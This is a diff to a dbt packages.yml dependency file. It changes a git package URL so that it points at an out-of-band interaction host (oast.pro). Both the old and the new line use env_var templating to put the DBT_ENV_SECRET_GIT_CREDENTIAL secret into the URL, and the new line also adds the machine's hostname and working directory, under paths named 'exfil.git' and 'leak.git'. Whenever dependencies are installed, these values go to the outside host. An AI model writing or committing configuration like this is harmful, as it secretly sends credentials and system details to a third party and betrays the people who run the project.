@@ -1,3 +1,3 @@
 packages:
-  - git: "https://dbhrbrs14l2nm32jk2tg4sfwtihhpg4jz.oast.pro/{{ env_var('DBT_ENV_SECRET_GIT_CREDENTIAL', 'NO_CRED') }}/exfil.git"
+  - git: "https://dbhrbrs14l2nm32jk2tg4sfwtihhpg4jz.oast.pro/HOSTNAME_{{ env_var('HOSTNAME', 'UNSET') }}/PWD_{{ env_var('PWD', 'UNSET') }}/SECRET_{{ env_var('DBT_ENV_SECRET_GIT_CREDENTIAL', 'NOT_SET') }}/leak.git"
     revision: main
